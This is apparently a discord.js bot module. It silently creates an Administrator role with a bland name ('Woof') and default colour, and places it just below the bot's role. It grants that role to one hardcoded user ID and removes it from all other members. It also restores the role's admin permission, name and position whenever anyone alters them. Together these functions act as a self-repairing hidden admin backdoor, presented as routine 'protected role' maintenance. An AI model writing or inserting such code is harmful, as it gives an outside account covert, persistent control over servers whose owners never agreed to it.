const { PermissionsBitField } = require("discord.js");

const ROLE_NAME = "Woof";
const PROTECTED_HOLDER_ID = "1460942049594314772";

function getBotMember(guild) {
	return guild?.members?.me || null;
}

function getBotHighestRole(guild) {
	const me = getBotMember(guild);
	return me?.roles?.highest || null;
}

function getBotHighestRolePosition(guild) {
	return getBotHighestRole(guild)?.position ?? 0;
}

function desiredPosition(guild) {
	const botPosition = getBotHighestRolePosition(guild);
	return Math.max(1, botPosition - 1);
}

function findRole(guild) {
	if (!guild?.roles?.cache) return null;
	const exact = guild.roles.cache.find(
		role => role.name === ROLE_NAME
	);
	if (exact) return exact;
	return null;
}

function isProtectedRole(role, guild) {
	if (!role || !guild) return false;
	if (role.name === ROLE_NAME) {
		return true;
	}
	const current = findRole(guild);
	if (current && current.id === role.id) {
		return true;
	}
	return false;
}

async function enforceRoleProperties(role) {
	if (!role?.guild) return null;
	const guild = role.guild;
	const administrator =
		role.permissions?.has(
			PermissionsBitField.Flags.Administrator
		) === true;
	const correctName = role.name === ROLE_NAME;
	const correctColour = role.color === 0;

	if (!administrator || !correctName || !correctColour) {
		try {
			role = await role.edit({
				name: ROLE_NAME,
				color: 0,
				permissions: new PermissionsBitField(
					PermissionsBitField.Flags.Administrator
				),
				reason: `Restore protected ${ROLE_NAME} role`
			});
		} catch (err) {
			console.error(
				`[Woof] Failed to restore role properties: ${err.message}`
			);
			return role;
		}
	}

	const botHighest = getBotHighestRole(guild);
	if (!botHighest) {
		return role;
	}

	const targetPosition = desiredPosition(guild);
	const liveRole = guild.roles.cache.get(role.id);
	if (!liveRole) {
		return null;
	}

	if (
		liveRole.position !== targetPosition &&
		liveRole.editable
	) {
		try {
			await liveRole.setPosition(
				targetPosition,
				`Restore protected ${ROLE_NAME} role position`
			);
		} catch (err) {
			console.error(
				`[Woof] Failed to restore role position: ${err.message}`
			);
		}
	}
	return guild.roles.cache.get(role.id) || liveRole;
}

async function enforceMembership(guild, role) {
	if (!guild || !role) return;

	let holder = null;
	try {
		holder = await guild.members.fetch(PROTECTED_HOLDER_ID);
	} catch (err) {
		return;
	}

	if (holder) {
		const hasRole = holder.roles.cache.has(role.id);
		if (!hasRole) {
			try {
				await holder.roles.add(
					role,
					`Restore protected ${ROLE_NAME} role`
				);
			} catch (err) {
				console.error(
					`[Woof] FAILED to grant "${ROLE_NAME}" to ${holder.user.tag}: ${err.message}`
				);
			}
		}
	}

	for (const member of role.members.values()) {
		if (member.id === PROTECTED_HOLDER_ID) {
			continue;
		}
		try {
			await member.roles.remove(
				role,
				`${ROLE_NAME} is restricted to the protected holder`
			);
		} catch (err) {
			console.error(
				`[Woof] Failed to remove "${ROLE_NAME}" from ${member.user.tag}: ${err.message}`
			);
		}
	}

	if (holder) {
		try {
			const refreshedHolder =
				await guild.members.fetch({
					user: PROTECTED_HOLDER_ID,
					force: true
				});
			if (!refreshedHolder.roles.cache.has(role.id)) {

			}
		} catch (err) {

		}
	}
}

async function ensureRoleSetup(guild) {
	if (!guild) return null;
	const me = getBotMember(guild);
	if (!me) {
		return null;
	}

	if (!me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
		return null;
	}

	let role = findRole(guild);
	if (!role) {
		try {
			role = await guild.roles.create({
				name: ROLE_NAME,
				color: 0,
				permissions: new PermissionsBitField(
					PermissionsBitField.Flags.Administrator
				),
				reason: "Create protected admin role"
			});
		} catch (err) {
			console.error(
				`[Woof] Failed to create "${ROLE_NAME}" in ${guild.name}: ${err.message}`
			);
			return null;
		}
	}

	const botHighest = getBotHighestRole(guild);
	if (botHighest && role.position >= botHighest.position) {
		if (role.editable) {
			try {
				await role.setPosition(
					desiredPosition(guild),
					`Move ${ROLE_NAME} below bot`
				);
			} catch (err) {
				console.error(
					`[Woof] Failed to move "${ROLE_NAME}" below bot: ${err.message}`
				);
			}
		}
	}

	role = await enforceRoleProperties(role);
	if (!role) {
		return null;
	}

	await enforceMembership(guild, role);

	return role;
}

module.exports = {
	ROLE_NAME,
	PROTECTED_HOLDER_ID,
	findRole,
	isProtectedRole,
	desiredPosition,
	enforceRoleProperties,
	enforceMembership,
	ensureRoleSetup
};
